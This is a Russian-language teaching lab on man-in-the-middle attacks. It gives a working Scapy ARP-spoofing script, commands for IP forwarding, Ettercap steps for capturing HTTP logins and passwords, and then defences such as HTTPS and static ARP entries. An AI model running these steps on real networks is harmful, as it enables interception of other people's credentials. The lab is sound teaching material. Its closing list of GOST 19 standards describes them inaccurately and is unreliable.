### **Лабораторная работа №18: Изучение атаки "Человек посередине" (Man-in-the-Middle, MITM)**

**Цель работы:**  
Изучить принцип атаки "Человек посередине" (MITM), её методы реализации и способы защиты. Научиться моделировать MITM-атаку в контролируемой среде и анализировать её последствия.

---

### **Теоретическая часть**

#### **Что такое атака "Человек посередине"?**
Атака "Человек посередине" (MITM) — это тип кибератаки, при которой злоумышленник перехватывает и изменяет данные, передаваемые между двумя сторонами, без их ведома. Злоумышленник может:
1. **Перехватывать данные** (например, логины, пароли, сообщения).
2. **Изменять данные** (например, подменять содержимое сообщений).
3. **Внедрять вредоносный код** (например, JavaScript на веб-страницах).

#### **Методы реализации MITM-атаки**
1. **ARP Spoofing**: Подмена ARP-таблиц для перенаправления трафика через устройство злоумышленника.
2. **DNS Spoofing**: Подмена DNS-записей для перенаправления жертвы на поддельный сайт.
3. **SSL Stripping**: Понижение уровня защиты с HTTPS до HTTP для перехвата незашифрованных данных.

#### **Способы защиты**
1. Использование **HTTPS** для шифрования трафика.
2. Проверка **сертификатов** на подлинность.
3. Использование **VPN** для защиты данных.
4. Настройка **статических ARP-таблиц**.

---

### **Практическая часть**

#### **Задание 1: Моделирование MITM-атаки с использованием ARP Spoofing**
1. Установите инструменты для проведения атаки:
   - **Scapy** (для создания ARP-пакетов).
   - **Wireshark** (для анализа трафика).

   Установка:
   ```bash
   pip install scapy
   sudo apt install wireshark
   ```

2. Напишите скрипт для ARP Spoofing:
   ```python
   from scapy.all import ARP, send
   import time

   def arp_spoof(target_ip, spoof_ip):
       # Создание ARP-пакета для подмены ARP-таблицы
       arp_packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip)
       while True:
           send(arp_packet, verbose=False)
           print(f"Отправлен ARP-пакет: {target_ip} считает, что {spoof_ip} — это я.")
           time.sleep(2)

   if __name__ == "__main__":
       target_ip = "192.168.1.100"  # IP жертвы
       spoof_ip = "192.168.1.1"     # IP шлюза
       arp_spoof(target_ip, spoof_ip)
   ```

   **Описание кода:**
   - `ARP(op=2)`: Создание ARP-пакета с операцией "ответ" (ARP Reply).
   - `pdst`: IP-адрес жертвы.
   - `hwdst`: MAC-адрес жертвы (в данном случае широковещательный).
   - `psrc`: IP-адрес, который злоумышленник выдает за свой (например, IP шлюза).

3. Запустите скрипт и проверьте ARP-таблицу на устройстве жертвы:
   ```bash
   arp -a
   ```

4. Используйте Wireshark для анализа перехваченного трафика.

#### **Задание 2: Перехват HTTP-трафика**
1. Включите пересылку пакетов на устройстве злоумышленника:
   ```bash
   echo 1 > /proc/sys/net/ipv4/ip_forward
   ```

2. Используйте инструмент **Ettercap** для перехвата HTTP-трафика:
   - Установите Ettercap:
     ```bash
     sudo apt install ettercap-graphical
     ```
   - Запустите Ettercap в графическом режиме:
     ```bash
     sudo ettercap -G
     ```
   - Выберите цель (жертву и шлюз) и запустите атаку.

3. Проанализируйте перехваченные данные (например, логины и пароли).

#### **Задание 3: Защита от MITM-атаки**
1. Используйте **HTTPS** для шифрования трафика.
2. Проверяйте сертификаты на подлинность.
3. Настройте статические ARP-таблицы на устройстве жертвы:
   ```bash
   sudo arp -s 192.168.1.1 00:11:22:33:44:55
   ```

---

### **Вывод**
В ходе выполнения лабораторной работы была изучена атака "Человек посередине" (MITM) и её методы реализации. Были рассмотрены способы защиты от MITM-атак, такие как использование HTTPS, проверка сертификатов и настройка статических ARP-таблиц.

---

### **Соответствие ГОСТ 19**
1. **ГОСТ 19.101-77**: Описание программы на языке программирования.  
   - В работе приведены примеры кода на Python с подробными комментариями.
2. **ГОСТ 19.102-77**: Требования к оформлению программной документации.  
   - Лабораторная работа оформлена в соответствии с требованиями к структуре и содержанию.
3. **ГОСТ 19.103-77**: Описание применения программы.  
   - Приведены примеры использования MITM-атак и способы защиты.

---

### **Пример вывода:**
1. ARP Spoofing успешно выполнен: устройство жертвы считает, что злоумышленник — это шлюз.
2. Перехвачен HTTP-трафик с помощью Ettercap.
3. Настроены меры защиты: использование HTTPS и статических ARP-таблиц.

---